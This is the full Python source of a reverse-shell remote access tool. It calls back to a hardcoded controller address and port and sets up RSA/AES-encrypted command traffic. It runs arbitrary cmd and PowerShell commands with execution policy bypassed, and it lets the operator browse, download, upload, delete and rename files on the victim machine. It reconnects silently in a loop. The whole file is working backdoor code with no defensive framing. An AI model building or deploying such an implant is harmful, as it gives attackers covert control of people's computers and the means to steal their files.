# pyinstaller --onefile ReverseTCP_RSA.py

import socket
import os
import struct
import subprocess
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
import json
import base64
from datetime import datetime

SERVER_IP = '192.168.1.107'
SERVER_PORT = 1111

def recv_all(sock, n):
    data = b''
    while len(data) < n:
        part = sock.recv(n - len(data))
        if not part:
            raise ConnectionError("Connection closed while receiving data")
        data += part
    return data

def recv_data(sock):
    raw_msglen = recv_all(sock, 4)
    if not raw_msglen:
        return b''
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recv_all(sock, msglen)

def send_data(sock, data_bytes):
    length = len(data_bytes)
    sock.sendall(length.to_bytes(4, 'big') + data_bytes)

class AESCipherTCP:
    def __init__(self, key):
        self.key = key if isinstance(key, bytes) else key.encode()
        if len(self.key) not in [16, 24, 32]:
            raise ValueError("Key must be 16, 24, or 32 bytes long")

    def encrypt(self, raw):
        raw = raw.encode('utf-8', errors='replace') if isinstance(raw, str) else raw
        padding_length = 16 - len(raw) % 16
        raw = raw + bytes([padding_length]) * padding_length
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc[16:])
        return decrypted[:-decrypted[-1]]

class RSACipher:
    def __init__(self, public_key_pem):
        self.public_key = RSA.import_key(public_key_pem)
        self.cipher = PKCS1_OAEP.new(self.public_key)

    def encrypt(self, data):
        return self.cipher.encrypt(data)


def browse_directory(path):
    try:
        if path.startswith('~'):
            path = os.path.expanduser(path)     
        if not os.path.exists(path):
            return {'success': False,'error': f"Path does not exist: {path}",'current_path': path,'parent_path': None,'items': []}
        items = []
        try:
            entries = os.listdir(path)
        except PermissionError:
            return {'success': False,'error': f"Permission denied to access {path}",'current_path': path,'parent_path': None,'items': []}
        
        for item in entries:
            item_path = os.path.join(path, item)
            try:
                stat = os.stat(item_path)
                is_dir = os.path.isdir(item_path)
                modified_timestamp = stat.st_mtime
                modified_time = datetime.fromtimestamp(modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                size_bytes = stat.st_size if not is_dir else 0    
                items.append({'name': item,'type': 'directory' if is_dir else 'file','size': size_bytes,'modified_time': modified_time})
            except (PermissionError, OSError):
                continue
        items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
        parent_path = os.path.dirname(path)
        if path.endswith(':\\') or path == '/':
            parent_path = None
        elif parent_path == path:
            parent_path = None
        return {'success': True,'current_path': path,'parent_path': parent_path,'items': items}
    except Exception as e:
        return {'success': False,'error': str(e),'current_path': path,'parent_path': None,'items': []}

def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return f"ERROR: File not found: {filepath}"
        
        filesize = os.path.getsize(filepath)
        filename = os.path.basename(filepath)
        
        with open(filepath, 'rb') as f:
            file_data = f.read()
        
        file_data_b64 = base64.b64encode(file_data).decode('ascii')
        
        return f"file-data:{filename}|{filesize}|{file_data_b64}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def upload_file(filepath, filedata_b64):
    try:
        file_data = base64.b64decode(filedata_b64)
        
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory)
        
        with open(filepath, 'wb') as f:
            f.write(file_data)
        
        return f"SUCCESS: File uploaded to {filepath}"
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def delete_file(filepath):
    try:
        if os.path.isdir(filepath):
            os.rmdir(filepath)
        else:
            os.remove(filepath)
        return f"SUCCESS: Deleted {filepath}"
    except Exception as e:
        return f"ERROR: {str(e)}"

def rename_file(old_path, new_path):
    try:
        os.rename(old_path, new_path)
        return f"SUCCESS: Renamed to {new_path}"
    except Exception as e:
        return f"ERROR: {str(e)}"



def execute_command(cmd):
    cmd = cmd.strip()
    
    if not cmd:
        return b"[no command received]"
    
    if cmd.lower() == "ping":
        return b"pong"
    
    if cmd.startswith("browse:"):
        browse_path = cmd[7:].strip()
        if not browse_path:
            browse_path = os.getcwd()
        dir_data = browse_directory(browse_path)
        json_str = json.dumps(dir_data, ensure_ascii=False)
        base64_data = base64.b64encode(json_str.encode('utf-8')).decode('ascii')
        return f"browse-data-{base64_data}".encode('utf-8')
    
    if cmd.startswith("download-file:"):
        filepath = cmd[14:].strip()
        result = download_file(filepath)
        return result.encode('utf-8')
    
    if cmd.startswith("upload-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            filepath, filedata_b64 = parts
            result = upload_file(filepath, filedata_b64)
            return result.encode('utf-8')
        else:
            return b"ERROR: Invalid upload format"
    
    if cmd.startswith("delete-file:"):
        filepath = cmd[12:].strip()
        result = delete_file(filepath)
        return result.encode('utf-8')
    
    if cmd.startswith("rename-file:"):
        parts = cmd[12:].split('|', 1)
        if len(parts) == 2:
            old_path, new_path = parts
            result = rename_file(old_path, new_path)
            return result.encode('utf-8')
        else:
            return b"ERROR: Invalid rename format"

    upper_cmd = cmd.upper()
    if upper_cmd.startswith("EP "):
        ps_command = cmd[3:].strip()
        return run_powershell_command(ps_command)
    elif upper_cmd.startswith("EP"):
        ps_command = cmd[2:].strip()
        return run_powershell_command(ps_command)
    else:
        return run_cmd_command(cmd)

def run_cmd_command(cmd):
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=False,
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]".encode('utf-8', errors='replace')
        return output if output else b"[+] Command executed (no output)"
    except subprocess.TimeoutExpired:
        return b"[-] Command timed out after 35 seconds"
    except Exception as e:
        return f"[-] CMD execution error: {str(e)}".encode('utf-8', errors='replace')

def run_powershell_command(ps_cmd):
    try:
        result = subprocess.run(
            [
                "powershell.exe",
                "-NoProfile",
                "-ExecutionPolicy", "Bypass",
                "-Command",
                ps_cmd
            ],
            capture_output=True,
            text=False, 
        )
        output = result.stdout + result.stderr
        if result.returncode != 0:
            output += f"\n[Exit Code: {result.returncode}]".encode('utf-8', errors='replace')
        return output if output else b"[+] PowerShell command executed (no output)"
    except subprocess.TimeoutExpired:
        return b"[-] PowerShell command timed out after 35 seconds"
    except Exception as e:
        return f"[-] PowerShell execution error: {str(e)}".encode('utf-8', errors='replace')
    
PUBLIC_KEY_PEM = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArzyg7KTBT/MpciW4UKSk
jWUz6y87YLNktzndjJvIpYTReAzK3ewzJihvz5l/uF4dCPZVhl9zvQW/9X501SmU
nCPz4F+iiunt4mXVqv4rK3/QAM5UH3gUwTdFTnUCYMR94ZoR0NvKfIDnDV6sZxiR
ETOwK5w+aQNF6H1/NcB1UuPKz1GpLtY9jcYYV6x+ihT1V/rGfFHdpNySHD6og+z1
NSq0D3JiGAuSSfhhV+aPCZ8By8eh735r50WCiBFUw3Bd6oPjyeKDwUVBgGip+3UH
0tlqFIZxHBPTCSZ6zJDW+40XWLlRSk5z1PLBJokiEQLiyxmA34rbmUzsRBD32L9y
jwIDAQAB
-----END PUBLIC KEY-----"""

AUTH_ID = b'0923692e-5c42-4dd1-95be-96c81755e423'

def main():
    rsa = RSACipher(PUBLIC_KEY_PEM)

    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))

            send_data(sock, rsa.encrypt(AUTH_ID))

            aes_key = os.urandom(32)
            send_data(sock, rsa.encrypt(aes_key))

            aes_cipher = AESCipherTCP(aes_key)

            while True:
                enc_cmd = recv_data(sock)
                if not enc_cmd:
                    break

                try:
                    cmd = aes_cipher.decrypt(enc_cmd).decode('utf-8', errors='replace').strip()
                except:
                    continue

                if cmd.lower() in ('exit', 'quit', 'close'):
                    break
                if cmd.lower() == "ping":
                    pong_enc = aes_cipher.encrypt("pong")
                    send_data(sock, pong_enc)
                    continue

                output = execute_command(cmd)

                if not output:
                    output = b"[no output]"

                send_data(sock, aes_cipher.encrypt(output))

        except:
            pass

        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

        time.sleep(4.5)

if __name__ == '__main__':
    main()
